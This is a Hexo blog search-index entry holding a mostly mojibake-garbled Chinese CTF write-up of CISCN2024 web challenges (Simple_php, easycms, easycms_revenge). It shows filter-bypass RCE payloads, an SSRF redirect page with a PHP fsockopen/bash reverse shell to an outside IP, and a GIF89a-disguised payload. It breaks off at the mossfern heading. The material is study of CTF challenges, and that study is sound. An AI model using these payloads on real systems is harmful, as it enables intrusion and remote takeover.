<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CISCN2024-webå¤ç°</title>
    <url>/2024/05/21/CISCN2024-web%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="åˆé‡å›½èµ›"><a href="#åˆé‡å›½èµ›" class="headerlink" title="åˆé‡å›½èµ›"></a>åˆé‡å›½èµ›</h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç¬¬ä¸€æ¬¡æ‰“å›½èµ›ï¼Œéš¾åº¦è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œä¸€é¢˜åšä¸€å¤©å”‰ï¼Œå¦‚å›¾æ‰€ç¤º(2&#x2F;6)</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240521223322525.png"  alt="image-20240521223322525"></p>
<p>è¯´å®è¯æˆ‘è®¤ä¸ºæˆ‘èƒ½åšå››é¢˜çš„ï¼Œç¬¬ä¸€å¤©ä¸€ç›´åœ¨çœ‹Simple_phpï¼Œæœ€åååˆ†é’Ÿæ‰“å‡ºæ¥äº†ï¼Œæ‰“å¾—æˆ‘éƒ½å‘æŠ–äº†ï¼Œç„¶åç¬¬äºŒå¤©æ‰å¼€å§‹çœ‹çš„cmsï¼Œæ˜ŸæœŸå¤©åˆšåˆšåˆ°å®éªŒå®¤æ‰“å¼€ç”µè„‘å°±çœ‹åˆ°å¤§Bå“¥æ·æŠ¥ä¼ æ¥</p>
<p><img   src="/../img/$%7Bfiilename%7D/2ea692c2a181a4ef0ae6828c46b8f539.jpg"  alt="2ea692c2a181a4ef0ae6828c46b8f539"></p>
<p>äº”åˆ†é’Ÿæ‹¿ä¸‹ä¸€è¡€ï¼Œä½ çŸ¥é“çš„ï¼Œå¤§bå“¥ä¾æ—§è¿™ä¹ˆå¼ºã€‚</p>
<p>ä¹‹åå°±å¼€å§‹äº†æ¼«é•¿çš„åç‰¢ç”Ÿæ´»ï¼Œä¸€ç›´å®¡æºç å®¡åˆ°ä¸‰ç‚¹æ‰åšäº†å‡ºæ¥</p>
<p>æœ€åå®åœ¨å¤ªç´¯äº†ï¼Œæœ‰ç§æƒ³æ­»çš„æ— åŠ›æ„Ÿï¼Œéšä¾¿æ‰“å¼€é¢˜çœ‹çœ‹ï¼Œå¼€äº†ä¸ªmossfenï¼Œç»™äº†æºç ä¸€çœ‹ï¼Œå°±çŸ¥é“æ˜¯pythonæ²™ç›’æ ˆå¸§é€ƒé€¸ï¼Œåœ¨ä¸­å›½æµ·æ´‹å¤§å­¦æ–°ç”Ÿèµ›å†™è¿‡ï¼Œä½†æ˜¯æ²¡å†™å‡ºæ¥ï¼Œèµ›åä¹Ÿæ²¡çœ‹ï¼Œå¥½åƒè€ƒè¯•å‰çœ‹è¿‡åŸé¢˜ä½†æ˜¯è®°ä¸èµ·æ¥çš„æ„Ÿè§‰ï¼Œæœ€åå®åœ¨ç´¯äº†ï¼Œæ‡’å¾—çœ‹äº†ã€‚æœ€åä¸¤ä¸ªå°æ—¶å°±éšä¾¿çœ‹çœ‹å¯†ç å’Œæ‚é¡¹ï¼ˆè™½ç„¶ä¸€ä¸ªæ²¡æ‰“å‡ºæ¥å°±æ˜¯äº†ï¼‰</p>
<p>èµ›åæ°´äº†æ°´ç¾¤ï¼Œæ‰çŸ¥é“mossfenè¿™é¢˜å’Œä¸­æµ·å¤§çš„èœé¸Ÿå·¥å…·2ç¡®å®æ˜¯åŒä¸€ä¸ªå‡ºé¢˜äººï¼Œäºæ˜¯æˆ‘ç—›å®šæ€ç—›ï¼Œæ¯æ¬¡æ¯”èµ›åéƒ½è¦å¥½å¥½å¤ç°ï¼Œæ‰€ä»¥ä¾¿æœ‰äº†è¿™ç¯‡æ–‡ç« </p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240521224229311.png"  alt="image-20240521224229311"></p>
<p>HnuSec_5æ‹¿äº†ä¸ªæ ¡å†…é˜Ÿç¬¬5ï¼Œå¾ˆä¼šé¢„è¨€çš„åå­—ï¼Œè¿™ä½¿æˆ‘å¤§è„‘æ—‹è½¬</p>
<p><img   src="/../img/$%7Bfiilename%7D/ok.jpg"  alt="ok"></p>
<h1 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span>      (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾ˆå¹²ç»ƒçš„ä¸€é¢˜rceï¼Œæ²¡æœ‰æ•´æ´»ï¼Œä½ æ‰§è¡Œä¸äº†éƒ½ä¸ç»™ä½ ä¸ªå›æ˜¾</p>
<p>è¿™è¾¹å¼€å±€çœ‹åˆ°äº†<code>escapeshelllcmd()</code>ï¼Œäºæ˜¯ä¸Šç½‘æŸ¥ï¼Œå¹¶ä¸”æœç´¢ç›¸å…³ç»•è¿‡å’Œæ¼æ´ï¼Œå­¦åˆ°äº†ä¸€ä¸‹ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å½“$cmdä¸­åŒ…å«â€˜&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$, \x0A å’Œ \xFFâ€™ä»»æ„ä¸€ä¸ªï¼Œè¿™ä¸ªå‡½æ•°éƒ½ä¼šåœ¨å‰é¢åŠ ä¸ªè½¬ä¹‰å­—ç¬¦ï¼Œä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Œå› ä¸ºè¿™äº›ä¸œè¥¿åœ¨linuxå‘½ä»¤è¡Œä¸­éƒ½æ˜¯ç‰¹åˆ«çš„å­˜åœ¨ï¼Œå…è®¸æˆ‘ä»¬ç©å¾ˆå¤šç»•è¿‡çš„èŠ±æ‹›</span><br><span class="line">&amp;:å¯å½“å‘½ä»¤çš„åˆ†éš”ç¬¦ï¼Œä¹Ÿå¯ä»¥ä¸&gt;&lt;ç»„æˆé‡å®šå‘çš„æ–‡ä»¶åˆå¹¶ï¼Œæ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„åå¼¹shell</span><br><span class="line">#:linuxå‘½ä»¤è¡Œçš„æ³¨é‡Šç¬¦(ç»ˆæ­¢ç¬¦)</span><br><span class="line">;:åˆ†éš”ç¬¦</span><br><span class="line">`:`cat flag`=&gt;flag&#123;ewoji_0000_114614&#125;</span><br><span class="line">|:éš”å¼€ä¸¤ä¸ªå‘½ä»¤ï¼Œå¹¶æŠŠä¸Šä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºå½“ä½œä¸‹ä¸ªå‘½ä»¤çš„è¾“å…¥,ls | grep &#x27;flag&#x27;</span><br><span class="line">*:åŒ¹é…ä»»æ„ä¸ªæ•°ä»»æ„å­—ç¬¦fla?.php</span><br><span class="line">?:åŒ¹é…ä¸€ä¸ªä»»æ„å­—ç¬¦f*</span><br><span class="line">~:cd ~åˆ‡æ¢åˆ°homeç›®å½•</span><br><span class="line">&lt;&gt;:é‡å®šå‘ç¬¦,å¯ä»¥ä½¿ç”¨cat&lt;flag.phpç»•è¿‡ç©ºæ ¼</span><br><span class="line">^:æœªçŸ¥ï¼Œä¼¼ä¹æ²¡æ‰¾åˆ°ä»€ä¹ˆæœ‰ç”¨çš„</span><br><span class="line">():æ— éœ€å¤šè¨€</span><br><span class="line">[]:[A-Za-z0-9]è¡¨ç¤ºæ‰€æœ‰å­—ç¬¦æ•°å­—ï¼Œ[a-c]è¡¨ç¤ºabc,[-%] â€ä»£è¡¨â€œ [!â€#$%] </span><br><span class="line">&#123;&#125;:&#123;e,w,o,j,i&#125;å¯è¡¨ç¤ºé‡Œé¢çš„ä»»æ„å­—ç¬¦ï¼Œè¿™ä¸ªéå¸¸å¥½ç”¨ï¼Œ[]åªèƒ½åœ¨å‚æ•°éƒ¨åˆ†åŒ¹é…ï¼Œè€Œ&#123;&#125;ç”šè‡³å¯ä»¥åœ¨å‘½ä»¤éƒ¨åˆ†åŒ¹é…</span><br><span class="line"></span><br><span class="line">$:1.å¯ä»¥è¡¨ç¤ºä¸€ä¸ªå˜é‡ï¼Œä½œå˜é‡æ‹¼æ¥a=f;b=l;c=a;d=g,$a$b$c$d=flag</span><br><span class="line">  2.å¯ä»¥è¡¨ç¤ºä¸€ä¸ªç©ºå˜é‡ç»•è¿‡ç©ºæ ¼,$*å’Œ$@ï¼Œ$x(x ä»£è¡¨ 1-9),$&#123;x&#125;(x&gt;=10) :æ¯”å¦‚ca$&#123;21&#125;t a.txtè¡¨ç¤ºcat a.txt åœ¨æ²¡æœ‰ä¼ å…¥å‚æ•°çš„æƒ…å†µä¸‹,è¿™äº›ç‰¹æ®Šå­—ç¬¦é»˜è®¤ä¸ºç©º,å¦‚ä¸‹:wh$1oami,who$@ami,whoa$*mi</span><br><span class="line">  3.å¯ä»¥çœ‹ä¸€äº›ç¯å¢ƒå˜é‡,echo $PATH,echo $SHELL</span><br><span class="line">  4.å¯ä»¥é…åˆ&#123;&#125;æˆªå–å­—æ¯ï¼Œå¦‚$&#123;PATH:5:1&#125;=&gt;l($PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line">  </span><br><span class="line">\x0A:æ¢è¡Œç¬¦</span><br><span class="line">\xFF:ä¸æ˜ç™½çš„ç¥ç§˜ç¬¦å·</span><br></pre></td></tr></table></figure>

<p>å’³å’³ï¼Œç„¶åå‘¢ï¼Œæœäº†ä¸€å¤§å †ç›¸å…³æ¼æ´ï¼Œä»€ä¹ˆå®½å­—èŠ‚éƒ½å‡ºæ¥äº†ï¼Œè¿˜æ˜¯æ‰“ä¸é€šï¼Œç´¢æ€§ä»ç»•è¿‡è¿™ä¸ªå‡½æ•°æ”¾å¼ƒ</p>
<p>ç„¶åæœ›ç€ä¸€æœ›æ— é™…çš„disable_functionsæ€è€ƒäººç”Ÿ</p>
<p>ä¸€ç›´åœ¨æ€è€ƒè¿™ä¸ªè½¬ä¹‰å­—ç¬¦èƒ½æœ‰ä»€ä¹ˆç”¨ï¼Œäºæ˜¯æˆ‘å¼€å¯äº†ç¬¬ä¸€æ³¢å°è¯•</p>
<p>payload:<code>php -r var_dump(1);</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240522125934038.png"  alt="image-20240522125934038"></p>
<p>æ‰§è¡Œäº†ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</p>
<p><a class="link"   href="https://www.cnblogs.com/jycjy/p/6937667.html" >Shellå‘½ä»¤è¡Œä¸­ç‰¹æ®Šå­—ç¬¦ä¸å…¶è½¬ä¹‰è¯¦è§£(å»é™¤ç‰¹æ®Šå«ä¹‰) - é…¸å¥¶åŠ ç»¿èŒ¶ - åšå®¢å›­ (cnblogs.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>ä¸€ä¸ªå‘½ä»¤çš„æ‰§è¡Œåº”è¯¥åŒ…æ‹¬ å‘½ä»¤+é€‰é¡¹+å‚æ•°ï¼Œä¸”é¡ºåºä¸èƒ½å˜</p>
<p>å°±å¥½æ¯”ä½ <code>ls &gt; test.txt</code>å¯ä»¥æˆåŠŸè€Œ<code>test.txt &lt; ls</code>ä¼šæŠ¥é”™è¯´æ²¡æœ‰lsè¿™ä¸ªæ–‡ä»¶</p>
<p>å‘½ä»¤å’Œé€‰é¡¹æŒ‰é¡ºåºå¡«å¥½åï¼Œå°±æ˜¯å‚æ•°äº†ï¼Œå‚æ•°ä¸æ˜¯ç‰¹æ®Šå­—ç¬¦ï¼Œå½“å‚æ•°åŒ…å«ç‰¹æ®Šå­—ç¬¦æ—¶éœ€è¦è½¬ä¹‰</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240522131043137.png"  alt="image-20240522131043137"></p>
<p>æ‰§è¡Œäº†ä¸¤ä¸ªä¸åŒçš„å‘½ä»¤ï¼Œå–å†³äº&amp;æœ‰æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œè¿™é‡Œæˆ‘ç”¨äº†â€™â€™å»è½¬ä¹‰&amp;ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨â€â€æˆ–\å»è½¬ä¹‰</p>
<p>è¿™æ ·å°±å¯ä»¥è§£é‡Šäº†æˆ‘çš„ <code>php -r var_dump\(1\)\;</code>ä¸ºä»€ä¹ˆæ‰§è¡Œäº†ï¼Œç‰¹æ®Šå­—ç¬¦è¢«è½¬ä¹‰ï¼Œå®é™…ä¸Šæ‰§è¡Œçš„å°±æ˜¯<code>php -r var_dump(1)</code></p>
<p><strong>æ‰€ä»¥è¯´æœ‰æ—¶å€™é™åˆ¶æˆ‘ä»¬çš„ï¼Œæ¢ä¸ªè§’åº¦çœ‹ï¼Œå°±å¯ä»¥å˜æˆå¸®åŠ©æˆ‘ä»¬çš„</strong></p>
<p>æ‰€ä»¥æ¥ä¸‹æ¥åªéœ€è¦ç¼–ç ç»•è¿‡disable_functionså³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1:cmd=php -r eval(hex2bin(substr(_73797374656d28276c7327293b,1)));=&gt;system(&#x27;ls&#x27;);</span><br><span class="line">è¿™é‡Œæ¶‰åŠåˆ°phpä¸€ä¸ªç‰¹æ€§,phpçš„å¸¸é‡å‘½åæ–¹å¼æ˜¯ä¸‹åˆ’çº¿+å­—æ¯ï¼Œå½“ä½ å°è¯•</span><br><span class="line">echo _123;ä¼šæŠ¥é”™ï¼Œä½†æ˜¯ä¼šæ­£å¸¸è¾“å‡º_123</span><br><span class="line">è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥æ­£å¸¸è·å¾—_åçš„å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload2:cmd=eval `ec\ho bHM=|base\64 -d`=&gt;eval &#x27;ls&#x27;</span><br></pre></td></tr></table></figure>

<p>rceä¹‹åè®°å¾—flagåœ¨æ•°æ®åº“é‡Œé¢ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<p><code>mysql -u root -proot -e xxxxx</code></p>
<h1 id="easycms-easycms-revenge"><a href="#easycms-easycms-revenge" class="headerlink" title="easycms&amp;&amp;easycms_revenge"></a>easycms&amp;&amp;easycms_revenge</h1><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><p>ä¸€ä¸ªhint:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>REMOTE_ADDRä¸å¯ä¼ªé€ ï¼Œéœ€è¦æ‰¾ssrf</p>
<p>å…¶å®ä¸€å¼€å§‹è¿˜å»è¯•äº†è¯•åˆ é™¤install.lockï¼Œä½†æ˜¯è¦æ‰¾adminåå°è¿˜è¦ç™»å½•ï¼Œåšäº†ä¸€å¤§å †æ— ç”¨åŠŸåæˆ‘æ‰æƒ³åˆ°è¦è¿›è¡Œssrfçš„</p>
<p>æ—¢ç„¶è¦è¯·æ±‚å¤–éƒ¨çš„èµ„æºï¼Œè‡ªç„¶è€Œç„¶çš„æƒ³åˆ°apiæ¨¡å—ï¼Œäºæ˜¯æ‰“å¼€æºç å¼€å§‹å®¡è®¡apiæ¨¡å—ï¼Œè²Œä¼¼æœ‰20å¤šä¸ªapiï¼Œä¸€ä¸ªä¸€ä¸ªå¾€ä¸‹å®¡ï¼Œå‘ç°ç¬¬ä¸‰ä¸ªå¯ä»¥ç”¨ï¼Œè¿˜ç®—è¿æ°”å¥½äº†ï¼Œå½“æ—¶å·²ç»å‡†å¤‡æ­»ç£•è¿™é‡Œäº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * äºŒç»´ç æ˜¾ç¤º</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">qrcode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;text&#x27;</span>));</span><br><span class="line">    <span class="variable">$thumb</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;thumb&#x27;</span>));</span><br><span class="line">    <span class="variable">$matrixPointSize</span> = (<span class="keyword">int</span>)<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;size&#x27;</span>);</span><br><span class="line">    <span class="variable">$errorCorrectionLevel</span> = <span class="title function_ invoke__">dr_safe_replace</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç”ŸæˆäºŒç»´ç å›¾ç‰‡</span></span><br><span class="line">    <span class="keyword">require_once</span> CMSPATH.<span class="string">&#x27;Library/Phpqrcode.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$file</span> = WRITEPATH.<span class="string">&#x27;file/qrcode-&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>.<span class="variable">$thumb</span>.<span class="variable">$matrixPointSize</span>.<span class="variable">$errorCorrectionLevel</span>).<span class="string">&#x27;-qrcode.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">\QRcode</span>::<span class="title function_ invoke__">png</span>(<span class="variable">$value</span>, <span class="variable">$file</span>, <span class="variable">$errorCorrectionLevel</span>, <span class="variable">$matrixPointSize</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$thumb</span>) &#123;</span><br><span class="line">            <span class="variable">$logo</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">dr_catcher_data</span>(<span class="variable">$thumb</span>));</span><br><span class="line">            <span class="variable">$QR_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$QR</span>);<span class="comment">//äºŒç»´ç å›¾ç‰‡å®½åº¦</span></span><br><span class="line">            <span class="variable">$QR_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$QR</span>);<span class="comment">//äºŒç»´ç å›¾ç‰‡é«˜åº¦</span></span><br><span class="line">            <span class="variable">$logo_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$logo</span>);<span class="comment">//logoå›¾ç‰‡å®½åº¦</span></span><br><span class="line">            <span class="variable">$logo_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$logo</span>);<span class="comment">//logoå›¾ç‰‡é«˜åº¦</span></span><br><span class="line">            <span class="variable">$logo_qr_width</span> = <span class="variable">$QR_width</span> / <span class="number">4</span>;</span><br><span class="line">            <span class="variable">$scale</span> = <span class="variable">$logo_width</span>/<span class="variable">$logo_qr_width</span>;</span><br><span class="line">            <span class="variable">$logo_qr_height</span> = <span class="variable">$logo_height</span>/<span class="variable">$scale</span>;</span><br><span class="line">            <span class="variable">$from_width</span> = (<span class="variable">$QR_width</span> - <span class="variable">$logo_qr_width</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//é‡æ–°ç»„åˆå›¾ç‰‡å¹¶è°ƒæ•´å¤§å°</span></span><br><span class="line">            <span class="title function_ invoke__">imagecopyresampled</span>(<span class="variable">$QR</span>, <span class="variable">$logo</span>, <span class="variable">$from_width</span>, <span class="variable">$from_width</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$logo_qr_width</span>, <span class="variable">$logo_qr_height</span>, <span class="variable">$logo_width</span>, <span class="variable">$logo_height</span>);</span><br><span class="line">            <span class="title function_ invoke__">imagepng</span>(<span class="variable">$QR</span>, <span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡ºå›¾ç‰‡</span></span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/png&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ImagePng</span>(<span class="variable">$QR</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªå¯ä»¥è¯·æ±‚å¤–éƒ¨èµ„æºå¹¶ä¸”ç”ŸæˆäºŒç»´ç çš„api</p>
<p>å…ˆçœ‹å¤§æ„:</p>
<p>1.æ¥æ”¶4ä¸ªå‚æ•°ï¼Œå…¶ä¸­text,size,levelæ˜¯å…³äºäºŒç»´ç çš„ä¿¡æ¯,thumbæ˜¯å…³äºlogoçš„ä¿¡æ¯,logoå°±æœ‰æ—¶å€™åœ¨äºŒç»´ç ä¸­é—´çš„é‚£ä¸ªå°å›¾ç‰‡</p>
<p>2.ç”¨å››ä¸ªå‚æ•°å‘½åä¸ºä¸€ä¸ªæ–‡ä»¶åï¼Œå¦‚æœå­˜åœ¨åˆ™ç›´æ¥è¯»å‡º$QR(å›¾ç‰‡å¯¹è±¡),è‹¥ä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ªå›¾ç‰‡å¯¹è±¡</p>
<p>3.æ£€æµ‹æ˜¯å¦éœ€è¦logoï¼Œå¦‚æœéœ€è¦logoï¼Œå°±é‡æ–°è°ƒæ•´å›¾ç‰‡å¹¶ä¸”æ’å…¥logo</p>
<p>æ‰€ä»¥è¯´ï¼Œlogoå›¾ç‰‡æ˜¯å¯ä»¥è¯·æ±‚å¤–éƒ¨èµ„æºè·å¾—çš„,é‚£å°±çœ‹çœ‹å®ƒæ€ä¹ˆæ¥çš„</p>
<p><code>$logo = imagecreatefromstring(dr_catcher_data($thumb));</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240523173818570.png"  alt="image-20240523173818570"></p>
<p>ssrfå…¥å£ç‚¹æ‰¾åˆ°äº†,äºæ˜¯åœ¨è‡ªå·±çš„vpså†™å¥½è·³è½¬,ç„¶ååœ¨cmdä¸Šå†™ä¸Šåå¼¹shellå‘½ä»¤å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target_url</span> = <span class="string">&quot;http://127.0.0.1/flag.php?cmd=php+-r+%27%24sock%3dfsockopen(%2247.100.177.241%22%2c23333)%3bexec(%22bash+%3c%263+%3e%263+2%3e%263%22)%3b%27&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$target_url</span>,<span class="literal">true</span>,<span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:<code>http://eci-2ze3cmcfbu4hoso5luoc.cloudeci1.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=Your vps&amp;text=1&amp;size=1&amp;level=1</code></p>
<p>å‘ç°æœ‰ä¸ªå¯æ‰§è¡Œæ–‡ä»¶readflag,.&#x2F;readflagå³å¯</p>
<h3 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h3><p>å‰é¢æ­¥éª¤ä¸€æ ·ï¼Œä¸»è¦æ˜¯å¯¹logoçš„è¯·æ±‚æœ‰äº†è¿‡æ»¤ï¼Œéœ€è¦å¯¹æ–‡ä»¶è¿›è¡Œä¼ªé€ ï¼Œç±»å‹æ–‡ä»¶ä¸Šä¼ çš„å›¾ç‰‡é©¬å§ï¼Œè¶…é“¾æ¥ç›´æ¥è¿æ¥èµ„æºï¼Œæ‰€ä»¥æ–‡ä»¶åä¸ä¼šè¢«æ£€æµ‹ï¼ˆæˆ‘çš„ç†è§£ï¼‰ï¼Œæ‰€ä»¥ä¼ªé€ å†…å®¹å°±å¥½</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">GIF89a<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeewwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooojjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target_url</span> = <span class="string">&quot;http://127.0.0.1/flag.php?cmd=php+-r+%27%24sock%3dfsockopen(%2247.100.177.241%22%2c23333)%3bexec(%22bash+%3c%263+%3e%263+2%3e%263%22)%3b%27&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$target_url</span>,<span class="literal">true</span>,<span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>çœ‹äº†ä¸€ä¸‹åˆ«äººwpå‘ç°æœ‰éé¢„æœŸï¼Œæœ‰ä¸ªdown_imgï¼Œä½†æ˜¯æˆ‘æ­»æ´»æ‰¾ä¸åˆ°ï¼Œå¯èƒ½æ˜¯æˆ‘ä¸‹è½½çš„æºç çš„é—®é¢˜ï¼Ÿï¼Ÿï¼Ÿè¿™å‡ºé¢˜äººä¸ç»™ä¸ªé™„ä»¶æœ‰ç‚¹é¡¶ä¸å¾—</p>
<h1 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h1><p>ç»™äº†ä¸¤ä¸ªé™„ä»¶</p>
<p>main.py</p>
